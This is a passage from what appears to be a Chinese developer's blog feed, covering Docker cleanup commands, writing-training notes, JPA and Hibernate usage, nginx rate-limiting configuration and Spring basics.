}</code></pre><p><a href="http://www.it1352.com/647250.html" target="_blank" rel="noopener">http://www.it1352.com/647250.html</a></p><h2 id="清理-docker"><a href="#清理-docker" class="headerlink" title="清理 docker"></a>清理 docker</h2><p>列出docker ID</p><pre><code>docker ps -aq</code></pre><p>停止所有容器</p><pre><code>docker stop $(docker ps -aq)</code></pre><p>docker 内置的docker 镜像清理</p><pre><code>docker image prune --force --all</code></pre><p> 删除所有停止的容器</p><pre><code>docker container prune</code></pre><p>docker 整体清理</p><pre><code>docker system prune -a</code></pre><h2 id="docker-文档"><a href="#docker-文档" class="headerlink" title="docker 文档"></a>docker 文档</h2><p><a href="https://docs.docker.com/" target="_blank" rel="noopener">https://docs.docker.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>TW 洞见写作培训</title>
      <link href="/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/tw-writing-training/"/>
      <url>/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/tw-writing-training/</url>
      
        <content type="html"><![CDATA[<h2 id="怎样算是一篇好的文章"><a href="#怎样算是一篇好的文章" class="headerlink" title="怎样算是一篇好的文章"></a>怎样算是一篇好的文章</h2><ul><li>表达力<ul><li>热点</li><li>故事</li><li>例子和连接</li><li>代入感，让读者感觉你是在写 ta 的感觉</li></ul></li><li>传播力<ul><li>外观和结构<ul><li>清晰地结构</li><li>吸引人的（小）标题</li><li>开门见山</li><li>结尾有力</li><li>恰到好处的金句</li></ul></li><li>字符和排版<ul><li>使用短句</li><li>图片，不一定强相关，隐隐约约和文章有一定联系，增强呼吸感</li><li>阅读奖赏</li><li>快速让读者获得需要的东西，参考文章《筷子定理》</li></ul></li></ul></li></ul><h2 id="好内容的本质"><a href="#好内容的本质" class="headerlink" title="好内容的本质"></a>好内容的本质</h2><ul><li>写你确信的东西，承认自己不足</li><li>有想法，有思考</li><li>有调查和采访</li></ul><h2 id="写之前的思考"><a href="#写之前的思考" class="headerlink" title="写之前的思考"></a>写之前的思考</h2><ul><li>我想传达什么讯息</li><li>我的目标受众是谁</li><li>目标周中的认知程度如何</li><li>我期待读者有什么法反应？</li></ul><h2 id="命题作文《如果我在沙漠中发现一整块十吨中的黄金，该怎么办？》"><a href="#命题作文《如果我在沙漠中发现一整块十吨中的黄金，该怎么办？》" class="headerlink" title="命题作文《如果我在沙漠中发现一整块十吨中的黄金，该怎么办？》"></a>命题作文《如果我在沙漠中发现一整块十吨中的黄金，该怎么办？》</h2><p>重点是细节，将一个简单问题做的丰满，很多问题没那么简单。</p><p>这个例子中，可以考虑如下方面：</p><ul><li>如何把这个黄金变成自己的？</li><li>如何运回去</li><li>如何切割</li><li>如何销售</li><li>如何不被国家发现</li><li>如何解释这一笔钱从何而来</li><li>如何一次卖出这些黄金，不导致金价变化</li></ul><h2 id="如何选题和立意"><a href="#如何选题和立意" class="headerlink" title="如何选题和立意"></a>如何选题和立意</h2><ul><li>有迹可循<ul><li>身边的事情，例如职业变化</li><li>热点事件</li></ul></li><li>有备而来<ul><li>收集浏览素材</li><li>梳理N个立意</li><li>确定核心立意</li></ul></li></ul><h2 id="文章框架"><a href="#文章框架" class="headerlink" title="文章框架"></a>文章框架</h2><ul><li>清单型结构 （对技术人来说最为友好，不带有主观概念）<ul><li>《那些年，我见过的【废柴】》</li></ul></li><li>叙述型结构<ul><li>过去 - 现在</li><li>过去 - 现在 - 未来</li><li>将来 - 过去 - 现在 </li></ul></li><li>板块递进式结构 （适合带有观点的，议论文）<ul><li>S（Situation）情境 问题发生的背景</li><li>Q（Question）问题 需要解决的问题</li><li>C（Conflict）冲突 现实中的矛盾、障碍</li><li>A（Answer) 答案 给出的解决方案</li></ul></li></ul><h2 id="如何开头"><a href="#如何开头" class="headerlink" title="如何开头"></a>如何开头</h2><ul><li>激发好奇 《被提出的用户》</li><li>直击痛点 《我选择，我喜欢》</li><li>关联用户 </li></ul><h2 id="如何标题"><a href="#如何标题" class="headerlink" title="如何标题"></a>如何标题</h2><ul><li>激发用户的好奇</li><li>引发用户的共鸣</li><li>戳中用户的痛点</li><li>制造用户的预期</li><li>学会蹭知名度</li></ul><h2 id="如何修改"><a href="#如何修改" class="headerlink" title="如何修改"></a>如何修改</h2><ul><li>先放一放，然后再<ul><li>总览全篇，打磨框架</li><li>删改词句</li><li>打磨情绪</li><li>默读全篇</li><li>寻求反馈</li></ul></li></ul><h2 id="写作的问题"><a href="#写作的问题" class="headerlink" title="写作的问题"></a>写作的问题</h2><ul><li>如何让写作内容变得丰满？<ul><li>安静下来</li></ul></li><li>什么样的程度的文章可以发表 china？</li></ul><h2 id="分享准备"><a href="#分享准备" class="headerlink" title="分享准备"></a>分享准备</h2><p>几个关键词</p><ul><li>感谢<ul><li>感谢帮我改稿的人</li><li>感谢帮我提出意见的人</li></ul></li><li>天赋<ul><li>记忆力不好的人更喜欢写作</li><li>想到了和写出来是两回事</li></ul></li><li>想法<ul><li>本质是抽象和总结</li><li>想法过多，使用一个列表记录下来</li></ul></li><li>贪婪<ul><li>塞入太多的东西和想法到文章中，《API 那篇文章》</li></ul></li><li>模仿<ul><li>模仿是最好的学习方法 《湖南农民运动考察报告》</li></ul></li><li>友好<ul><li>和读者做朋友，不好好为人师</li></ul></li><li>价值<ul><li>有道理和有用的</li><li>没有写下来之前不知道有没有价值</li><li>checklist 最适合我，选择适合</li></ul></li><li>思考<ul><li>程序员的写作是一种思考方式，与风月无关</li><li>《一本小小的写作书》</li><li>《一本小小的逻辑书》</li></ul></li><li>技巧<ul><li>难说有用，但是没那么重要</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 职业素质 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>JPA Criteria</title>
      <link href="/Spring/spring/jpa-criteria/"/>
      <url>/Spring/spring/jpa-criteria/</url>
      
        <content type="html"><![CDATA[<h2 id="在-EntityManager-中使用-Criteria"><a href="#在-EntityManager-中使用-Criteria" class="headerlink" title="在 EntityManager 中使用 Criteria"></a>在 EntityManager 中使用 Criteria</h2><pre><code>// 1. 获取 builderCriteriaBuilder criteriaBuilder = entityManager.getCriteriaBuilder();// 2. 创建 queryCriteriaQuery&lt;Feature&gt; query = criteriaBuilder.createQuery(Feature.class);// 3. 获取根对象，根对象可以有多个Root&lt;Feature&gt; root = query.from(Feature.class);// 4. 查询大于 1 的条件Predicate predicate = criteriaBuilder.greaterThanOrEqualTo(root.get(&quot;id&quot;), 1L);Predicate predicate1 = criteriaBuilder.equal(root.get(&quot;name&quot;), &quot;年龄&quot;);query.where(criteriaBuilder.and(predicate, predicate1));// 4. 执行构造出的条件List&lt;Feature&gt; resultList = entityManager.createQuery(query).getResultList();</code></pre>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>JPA JOIN 的用法</title>
      <link href="/Spring/spring/jpa-join/"/>
      <url>/Spring/spring/jpa-join/</url>
      
        <content type="html"><![CDATA[<h2 id="JPA-JOIN-支持的条件"><a href="#JPA-JOIN-支持的条件" class="headerlink" title="JPA JOIN 支持的条件"></a>JPA JOIN 支持的条件</h2><p>JPA JOIN 支持 内连接和左外连接，JPA 的 Join 必须是两个实体之间存在关联当前情况下才需要这样操作。</p><p>推荐只是简单地情况下这样使用，复杂的情况直接编写 native sql 来完成。</p><p>Feature 和 FeatureValue 是一对多关系，查询方法如下</p><pre><code>    @Query(&quot;select distinct feature from Feature feature inner join fetch feature.featureValues&quot;)    List&lt;Feature&gt; findFeatureWithJoin();</code></pre><p>Feature 中需要设置一个一对多的关联</p><pre><code>public class Feature implements Serializable {    @OneToMany(fetch = FetchType.EAGER, cascade = CascadeType.ALL)    @JoinColumn(name = &quot;feature_id&quot;)    private List&lt;FeatureValue&gt; featureValues;}</code></pre><h2 id="迫切关联连接"><a href="#迫切关联连接" class="headerlink" title="迫切关联连接"></a>迫切关联连接</h2><p>在查询的 JPQL 语句中有一个 fetch，这个 fetch 可以自动将join 后的结果集使用一对多的方式组织数据，避免 N+1 问题，平时项目都是用 fetch 的方法。</p>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>接口访问限制方案</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/api-limitation/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/api-limitation/</url>
      
        <content type="html"><![CDATA[<h2 id="使用-nginx-缓存限制"><a href="#使用-nginx-缓存限制" class="headerlink" title="使用 nginx 缓存限制"></a>使用 nginx 缓存限制</h2><p>expires起到控制页面缓存的作用，合理的配置expires可以减少很多服务器的请求<br>要配置expires，可以在http段中或者server段中或者location段中加入<br>PS. 可以限制单个接口的访问</p><p>只需要增加一个反向代理，然后设置 1 秒过期即可，1 s内拿到的是同样的内容。可以将图片等静态资源文件设置时间较长，接口 API 时间设置较短即可。</p><pre><code>location ~ ^/user/ {      proxy_pass http://user.example.com;        expires 1;   //1h //1d //expires max; 部分文件看需要可以永久 }</code></pre><h2 id="利用-Ngnix-的IP限制访问次数"><a href="#利用-Ngnix-的IP限制访问次数" class="headerlink" title="利用 Ngnix 的IP限制访问次数"></a>利用 Ngnix 的IP限制访问次数</h2><p>nginx可以通过HttpLimitReqModul和HttpLimitZoneModule配置来限制ip在同一时间段的访问次数。</p><p>HttpLimitReqModul用来限制连单位时间内连接数的模块，使用limit_req_zone和limit_req指令配合使用来达到限制。一旦并发连接超过指定数量，就会返回503错误。</p><p>HttpLimitConnModul用来限制单个ip的并发连接数，使用limit_zone和limit_conn指令。</p><p>这两个模块的区别前一个是对一段时间内的连接数限制，后者是对同一时刻的连接数限制。</p><p>配置实例</p><pre><code>http{    ...    #定义一个名为allips的limit_req_zone用来存储session，大小是10M内存，    #以$binary_remote_addr 为key,限制平均每秒的请求为20个，    #1M能存储16000个状态，rete的值必须为整数，    #如果限制两秒钟一个请求，可以设置成30r/m    limit_req_zone $binary_remote_addr zone=allips:10m rate=20r/s;    ...    server{        ...        location {            ...            #限制每ip每秒不超过20个请求，漏桶数burst为5            #brust的意思就是，如果第1秒、2,3,4秒请求为19个，            #第5秒的请求为25个是被允许的。            #但是如果你第1秒就25个请求，第2秒超过20的请求返回503错误。            #nodelay，如果不设置该选项，严格使用平均速率限制请求数，            #第1秒25个请求时，5个请求放到第2秒执行，            #设置nodelay，25个请求将在第1秒执行。            limit_req zone=allips burst=5 nodelay;            ...        }        ...    }    ...}</code></pre><h2 id="使用-Redis-在应用层面限制"><a href="#使用-Redis-在应用层面限制" class="headerlink" title="使用 Redis 在应用层面限制"></a>使用 Redis 在应用层面限制</h2><p>使用拦截器对请求根据 IP 计数，写入 redis。这种方案没有 Ngnix 高效。<br>可以参考 el-admin 中的实现。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.cnblogs.com/wangdaijun/p/6264288.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangdaijun/p/6264288.html</a></li><li><a href="https://www.cnblogs.com/saneri/p/5315535.html" target="_blank" rel="noopener">https://www.cnblogs.com/saneri/p/5315535.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ThoughtWorks Tech Lead 能力</title>
      <link href="/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/tw-tech-lead/"/>
      <url>/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/tw-tech-lead/</url>
      
        <content type="html"><![CDATA[<h2 id="构建项目基础设施"><a href="#构建项目基础设施" class="headerlink" title="构建项目基础设施"></a>构建项目基础设施</h2><p>能使用 ansible 搭建一套 CI/CD 基础设施</p><p>这里有一套基础设施和运维脚本</p><ul><li><a href="https://github.com/linksgo2011/deployment-automation" target="_blank" rel="noopener">https://github.com/linksgo2011/deployment-automation</a></li></ul><h2 id="搭建种子项目"><a href="#搭建种子项目" class="headerlink" title="搭建种子项目"></a>搭建种子项目</h2><p>能快速启动一个项目骨架，单体应用使用下面的种子项目</p><ul><li><a href="https://github.com/linksgo2011/spring-boot-boilerplate" target="_blank" rel="noopener">https://github.com/linksgo2011/spring-boot-boilerplate</a></li></ul><h2 id="团队工作方法"><a href="#团队工作方法" class="headerlink" title="团队工作方法"></a>团队工作方法</h2><p>能规范团队运行方法，这里有一套 Way of working 规范了开发过程和上线的一些 check list</p><ul><li><a href="http://www.printf.cn/index.php/way-of-working.html" target="_blank" rel="noopener">http://www.printf.cn/index.php/way-of-working.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 职业素质 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>JPA 投影</title>
      <link href="/Spring/spring/jpa-projection/"/>
      <url>/Spring/spring/jpa-projection/</url>
      
        <content type="html"><![CDATA[<h2 id="JPA-投影的用处"><a href="#JPA-投影的用处" class="headerlink" title="JPA 投影的用处"></a>JPA 投影的用处</h2><p>在 DDD 的读模型中，使用投影可以查询和领域模型不同的字段，带来非常大的灵活性。</p><p>如果有实体</p><pre><code>public class Feature implements Serializable {    @Id    @GeneratedValue(strategy = GenerationType.IDENTITY)    private Long id;    private String name;    private Integer step;    @OneToMany(fetch = FetchType.EAGER, cascade = CascadeType.ALL)    @JoinColumn(name = &quot;feature_id&quot;)    private List&lt;FeatureValue&gt; featureValues;    @CreationTimestamp    @Column(name = &quot;create_at&quot;)    private Timestamp createAt;    @UpdateTimestamp    @Column(name = &quot;update_at&quot;)    private Timestamp updateAt;}</code></pre><p>如果只需要查询 Feature 中部分字段，则只需要定义一个接口接收即可</p><pre><code>public interface FeatureInterfaceProjection {    String getName();}</code></pre><p>在 Repository 中使用</p><pre><code>@Repositorypublic interface FeatureRepository extends JpaRepository&lt;Feature, Long&gt;,        JpaSpecificationExecutor&lt;Feature&gt; {    FeatureInterfaceProjection findDistinctFirstByName(String name);}</code></pre><p>FeatureInterfaceProjection 的用法是通过接口的投影</p><h2 id="使用对象的投影（更常用）"><a href="#使用对象的投影（更常用）" class="headerlink" title="使用对象的投影（更常用）"></a>使用对象的投影（更常用）</h2><p>将 FeatureInterfaceProjection  定义为对象也可以使用投影，提供的 setter/getter 方法即可</p><pre><code>public class FeatureProjection {    public FeatureProjection(String name) {        this.name = name;    }    private String name;    public String getName() {        return name;    }    public void setName(String name) {        this.name = name;    }}</code></pre><p>例如在 Repository 中编写 </p><pre><code>List&lt;FeatureProjection&gt; findAllByName(String name);</code></pre><h2 id="手写-JPQL-的方式使用投影"><a href="#手写-JPQL-的方式使用投影" class="headerlink" title="手写 JPQL 的方式使用投影"></a>手写 JPQL 的方式使用投影</h2><pre><code>    @Query(&quot;select distinct new springbootboilerplate.read.FeatureProjection(f.name) from Feature f&quot;)    FeatureProjection findFirstByName(String name);</code></pre><p>在 select 的结果集中 new 出需要对象即可。</p><p>需要注意在 JPQL 中写完整结果集的类的对象 </p><p>springbootboilerplate.read.FeatureProjection 不然会报类找不到。</p><p>如果不想使用 new 的方法，可以使用在结果集的对象上/类上，打上 @Projection 注解，并给出类的来源 types 属性</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://stackoverflow.com/questions/46083329/no-converter-found-capable-of-converting-from-type-to-type" target="_blank" rel="noopener">https://stackoverflow.com/questions/46083329/no-converter-found-capable-of-converting-from-type-to-type</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 转换方案</title>
      <link href="/java/java/java-object-mapping/"/>
      <url>/java/java/java-object-mapping/</url>
      
        <content type="html"><![CDATA[<h2 id="ModelMapper"><a href="#ModelMapper" class="headerlink" title="ModelMapper"></a>ModelMapper</h2><h2 id="mapstruct"><a href="#mapstruct" class="headerlink" title="mapstruct"></a>mapstruct</h2><h2 id="Orika"><a href="#Orika" class="headerlink" title="Orika"></a>Orika</h2>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用 DataJpaTest 对接数据库测试</title>
      <link href="/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/data-jpa-test/"/>
      <url>/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/data-jpa-test/</url>
      
        <content type="html"><![CDATA[<h2 id="一个测试基类"><a href="#一个测试基类" class="headerlink" title="一个测试基类"></a>一个测试基类</h2><pre><code>@RunWith(SpringRunner.class)@ActiveProfiles(profiles = &quot;test&quot;)@DataJpaTestpublic abstract class BusinessBaseTest {    @Autowired    private Flyway flyway;    @Before    public void setUp() throws Exception {        flyway.clean();        flyway.migrate();    }}</code></pre><h2 id="一些有用的注解"><a href="#一些有用的注解" class="headerlink" title="一些有用的注解"></a>一些有用的注解</h2><h3 id="RunWith-SpringRunner-class"><a href="#RunWith-SpringRunner-class" class="headerlink" title="RunWith(SpringRunner.class)"></a>RunWith(SpringRunner.class)</h3><p>SpringRunner 启动了 Spring 上下文环境，但是没有启动 Spring boot 相关自动配置。</p><h3 id="DataJpaTest"><a href="#DataJpaTest" class="headerlink" title="@DataJpaTest"></a>@DataJpaTest</h3><p>自动配数据源相关的配置。</p>]]></content>
      
      
      <categories>
          
          <category> 质量保证 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>如何评估一个系统的容量</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/system-capacity/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/system-capacity/</url>
      
        <content type="html"><![CDATA[<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>评估系统负载 <a href="https://www.cnblogs.com/softidea/p/11969205.html" target="_blank" rel="noopener">https://www.cnblogs.com/softidea/p/11969205.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>快速学习的一些要点</title>
      <link href="/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/quick-learn/"/>
      <url>/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/quick-learn/</url>
      
        <content type="html"><![CDATA[<h2 id="学习的一般过程"><a href="#学习的一般过程" class="headerlink" title="学习的一般过程"></a>学习的一般过程</h2><ul><li>采访专业的人，了解知识框架和学习路线</li><li>倍速看视频教程，了解如何做</li><li>编写代码，动手实践，遇到问题搜索</li><li>落入知识系统，可以将做的实验作为例子编写笔记</li><li>看相关的书深入学习，了解原理以及<strong>使用中的一些注意事项</strong></li><li>看源码</li><li>将知识系统中有价值的内容整理成博客</li></ul><h2 id="学习的注意事项"><a href="#学习的注意事项" class="headerlink" title="学习的注意事项"></a>学习的注意事项</h2><ul><li>少量学习，多去实践</li></ul><h2 id="编程相关学习资源"><a href="#编程相关学习资源" class="headerlink" title="编程相关学习资源"></a>编程相关学习资源</h2><p>中文学习资源网站 </p><ul><li>网易云课堂 <a href="http://study.163.com/" target="_blank" rel="noopener">http://study.163.com/</a></li></ul><p>英文学习资源网站</p><ul><li>Lynda.com <a href="https://www.lynda.com/" target="_blank" rel="noopener">https://www.lynda.com/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 职业素质 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Hibernate 基础</title>
      <link href="/hibernate/hibernate/hibernate-baisc/"/>
      <url>/hibernate/hibernate/hibernate-baisc/</url>
      
        <content type="html"><![CDATA[<h2 id="Hibernate-和-JPA-以及-Spring-data"><a href="#Hibernate-和-JPA-以及-Spring-data" class="headerlink" title="Hibernate 和 JPA 以及 Spring data"></a>Hibernate 和 JPA 以及 Spring data</h2><ul><li>JPA的是 Java Persistence API 的简写，是Sun官方提出的一种ORM规范</li><li>Hibernate 是 JPA 的一种实现</li><li>Spring data 对 Hibernate 进行了一些包装，提供了一些便利的接口和方法，本质还是使用 JPA 实现。Hibernate 为其默认实现。</li></ul><p>Hibernate  适用于富域模型的程序，如果模型比较简单 Hibernate 无法发挥其最大的优势。</p><p>使用实体时候，需要注意关注点分离，确保业务方便的关注点之外，其他关注点不要渗入模型中来。例如视图相关，不应直接使用领域对象到视图层。</p><h2 id="Hibernate-的三种状态"><a href="#Hibernate-的三种状态" class="headerlink" title="Hibernate 的三种状态"></a>Hibernate 的三种状态</h2><ul><li>瞬时状态 (Transient) ,不和 Session 实例关联，例如 new 出来的一个实体</li><li>持久状态 (Persistent),持久化对象就是已经被保存进数据库的实体对象，并且这个实体对象现在还处于Hibernate的缓存管理之中。 例如从数据库中查询出来的实体。</li><li>脱管状态 (Detached)，在数据库中存在一条对应的记录，但是当前没有与 session 关联</li></ul><p>三种状态对应操作的转换图:</p><p><img src="/hibernate/hibernate/hibernate-baisc/status.jpg" alt=""></p><h2 id="使用-Hibernate-的一些注意事项"><a href="#使用-Hibernate-的一些注意事项" class="headerlink" title="使用 Hibernate 的一些注意事项"></a>使用 Hibernate 的一些注意事项</h2><ul><li>实体最好实现 Serializable 接口</li><li>Hibernate 会使用 getter 方法进行对比，因此 getter 方法不应该对数据进行修改和转换，否则 Hibernate 会进行一次额外的 SQL 执行</li><li>在绘制 UML 图的时候，可以加入原型类图（标注是实体还是值对象）</li><li>如果有可能不要公开 ID 的set方法（使用了lombok 就没办法了）</li><li>推荐使用 long 作为 ID，足够支撑系统运行时间，映射到数据库中为 bigint</li><li>如果不想每次都给特定字段编写 @Column 可以定义一个 PhysicalNammingStrategy</li></ul><h2 id="Hibernate-对-Java-和-MySQL-的映射关系"><a href="#Hibernate-对-Java-和-MySQL-的映射关系" class="headerlink" title="Hibernate 对 Java 和 MySQL 的映射关系"></a>Hibernate 对 Java 和 MySQL 的映射关系</h2>]]></content>
      
      
      <categories>
          
          <category> hibernate </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Hibernate 主键生成策略</title>
      <link href="/hibernate/hibernate/hibernate-id/"/>
      <url>/hibernate/hibernate/hibernate-id/</url>
      
        <content type="html"><![CDATA[<h2 id="使用-JPA-生成策略"><a href="#使用-JPA-生成策略" class="headerlink" title="使用 JPA 生成策略"></a>使用 JPA 生成策略</h2><p>在实体中使用 @GeneratedValue 即可生成</p><pre><code>public class Role implements Serializable {    @Id    @GeneratedValue(strategy = GenerationType.IDENTITY)    private Long id;}</code></pre><p>JPA 标准中默认支持四种策略</p><ul><li>TABLE //使用一个额外的数据库表来保存主键</li><li>SEQUENCE //使用序列的方式，且其底层数据库要支持序列，一般有postgres、Oracle等</li><li>IDENTITY //主键由数据库生成，一般为自增型主键，支持的有MySql和Sql Server</li><li>AUTO //由程序来决定主键规则</li></ul><p>如果不指定策略，默认为 AUTO</p><h2 id="Hibernate-内置策略"><a href="#Hibernate-内置策略" class="headerlink" title="Hibernate 内置策略"></a>Hibernate 内置策略</h2><p>除了 JPA 标准策略之外 Hibernate 还有很多其他策略。可以在实体类中定义一个生成器。然后再 GeneratedValue 注解中使用即可。</p><pre><code>@Entity@Table(name = &quot;ip_user&quot;)@GenericGenerator(name = &quot;jpa-uuid&quot;, strategy = &quot;uuid&quot;)public class User  implements Serializable {    @Id    @GeneratedValue(generator = &quot;jpa-uuid&quot;)    @Column(length = 32)    private String userId;    ...}</code></pre><p>在 Hibernate 源码中，DefaultIdentifierGeneratorFactory 注册了大量的生成器。</p><pre><code> public DefaultIdentifierGeneratorFactory() {        register( &quot;uuid2&quot;, UUIDGenerator.class );        register( &quot;guid&quot;, GUIDGenerator.class );            // can be done with UUIDGenerator + strategy        register( &quot;uuid&quot;, UUIDHexGenerator.class );         // &quot;deprecated&quot; for new use        register( &quot;uuid.hex&quot;, UUIDHexGenerator.class );     // uuid.hex is deprecated        register( &quot;assigned&quot;, Assigned.class );        register( &quot;identity&quot;, IdentityGenerator.class );        register( &quot;select&quot;, SelectGenerator.class );        register( &quot;sequence&quot;, SequenceStyleGenerator.class );        register( &quot;seqhilo&quot;, SequenceHiLoGenerator.class );        register( &quot;increment&quot;, IncrementGenerator.class );        register( &quot;foreign&quot;, ForeignGenerator.class );        register( &quot;sequence-identity&quot;, SequenceIdentityGenerator.class );        register( &quot;enhanced-sequence&quot;, SequenceStyleGenerator.class );        register( &quot;enhanced-table&quot;, TableGenerator.class );    }    public void register(String strategy, Class generatorClass) {        LOG.debugf( &quot;Registering IdentifierGenerator strategy [%s] -&gt; [%s]&quot;, strategy, generatorClass.getName() );        final Class previous = generatorStrategyToClassNameMap.put( strategy, generatorClass );        if ( previous != null ) {            LOG.debugf( &quot;    - overriding [%s]&quot;, previous.getName() );        }    }</code></pre><p>常用的说明</p><h3 id="uuid"><a href="#uuid" class="headerlink" title="uuid"></a>uuid</h3><p>采用 128位的uuid算法生成主键，uuid被编码为一个32位16进制数字的字符串。<br>当使用strategy为uuid时，使用的时hibernate自己定义的UUID生成算法，此策略已过时，其具体实现参照org.hibernate.id. UUIDHexGenerator, 生成的字符串如402880876359adeb016359ae27190000<br>当使用strategy为uuid2时，此为此版本推荐使用的uuid生成算法，其默认采用标准的生成策略StandardRandomStrategy，实现为使用jdk自带的uuid生成方法，生成的字符串如<br>4af17c8e-8317-43e9-aff9-12d5590a71c6</p><h3 id="assigned"><a href="#assigned" class="headerlink" title="assigned"></a>assigned</h3><p>插入主键时，由程序来指定。相当于JPA中的AUTO。</p><h3 id="guid"><a href="#guid" class="headerlink" title="guid"></a>guid</h3><p>采用数据库底层的guid算法机制，对应MYSQL的uuid()函数，SQL Server的newid()函数，ORACLE的rawtohex(sys_guid())函数等</p>]]></content>
      
      
      <categories>
          
          <category> hibernate </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>常用断言写法</title>
      <link href="/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/assert-basic/"/>
      <url>/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/assert-basic/</url>
      
        <content type="html"><![CDATA[<h2 id="基本断言写法"><a href="#基本断言写法" class="headerlink" title="基本断言写法"></a>基本断言写法</h2><p>使用 assertEquals</p><pre><code>assertEquals(roleResponse.getName(), &quot;new_super_admin&quot;);</code></pre><p>使用 assertThat 配合 result matcher 实现</p><pre><code>assertThat(roleResponse.getCreateAt(), isA(Timestamp.class));</code></pre><h2 id="使用-assertJ-中的BDD写法"><a href="#使用-assertJ-中的BDD写法" class="headerlink" title="使用 assertJ 中的BDD写法"></a>使用 assertJ 中的BDD写法</h2><p>使用 hasSize 和 contains 方法</p><pre><code>assertThat(customers).hasSize(3).contains(customer1, customer2, customer3);</code></pre><p>使用 equalTo 方法</p><pre><code>assertThat(foundCustomer).isEqualTo(customer2);</code></pre>]]></content>
      
      
      <categories>
          
          <category> 质量保证 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring 基础</title>
      <link href="/Spring/spring/spring-basic/"/>
      <url>/Spring/spring/spring-basic/</url>
      
        <content type="html"><![CDATA[<h2 id="Spring-项目组成"><a href="#Spring-项目组成" class="headerlink" title="Spring 项目组成"></a>Spring 项目组成</h2><p>Spring 是一个开源框架，是为了解决企业应用程序开发复杂性而创建的（替代更加重量级的企业级Java技术， 尤其是EJB），它完成了大量开发中的通用步骤，留给开发者的仅仅是与特定应用相关的部分，从而大大提高了企业应用的开发效率。</p><p>Spring 框架是一个分层架构，由 7 个定义良好的模块组成。Spring 模块构建在核心容器之上，核心容器定义了创建、配置和管理 bean 的方式如下图：</p><p><img src="/Spring/spring/spring-basic/spring-architecture.gif" alt=""></p><p>每个模块的功能: </p><ul><li>Spring 核心容器：核心容器提供 Spring 框架的基本功能，管理着Spring应用中bean的创建、配置和管理。核心容器的主要组件是 BeanFactory，它是工厂模式的实现。BeanFactory 使用DI将应用程序的配置和依赖性规范与实际的应用程序代码分开。</li><li>Spring 上下文：Spring 上下文是一个配置文件，向 Spring 框架提供上下文信息。提供了一种框架式的对象访问方法，有些象JNDI注册器。Context封装包的特性得自于Beans封装包，并添加了对国际化（I18N）的支持（例如资源绑定），事件传播，资源装载的方式和Context的透明创建，比如说通过Servlet容器。Spring 上下文和Bean工厂都是 bean 容器 的实现。</li><li>Spring AOP：通过配置管理特性，Spring AOP 模块直接将面向方面的编程功能集成到了 Spring 框架中。所以，可以很容易地使 Spring 框架管理的任何对象支持 AOP。Spring AOP 模块为基于 Spring 的应用程序中的对象提供了事务管理服务。</li><li>Spring DAO：JDBC DAO 抽象层提供了有意义的异常层次结构，可用该结构来管理异常处理和不同数据库供应商抛出的错误消息。异常层次结构简化了错误处理，并且极大地降低了需要编写的异常代码数量（例如打开和关闭连接）。Spring DAO 的面向 JDBC 的异常遵从通用的 DAO 异常层次结构。</li><li>Spring ORM：Spring 框架插入了若干个 ORM 框架，从而提供了 ORM 的对象关系工具，其中包括 JDO、Hibernate 和 iBatis SQL Map。所有这些都遵从 Spring 的通用事务和 DAO 异常层次结构。</li><li>Spring Web 模块：Web 上下文模块建立在应用程序上下文模块之上，为基于 Web 的应用程序提供了上下文。</li><li>Spring MVC 框架：MVC 框架是一个全功能的构建 Web 应用程序的 MVC 实现。通过策略接口，MVC 框架变成为高度可配置的，MVC 容纳了大量视图技术，其中包括 JSP、Velocity、Tiles、iText 和 POI。</li></ul><h2 id="Spring-常用注解"><a href="#Spring-常用注解" class="headerlink" title="Spring 常用注解"></a>Spring 常用注解</h2><h3 id="声明-bean-注解类"><a href="#声明-bean-注解类" class="headerlink" title="声明 bean  注解类"></a>声明 bean  注解类</h3><ul><li><p>@Component 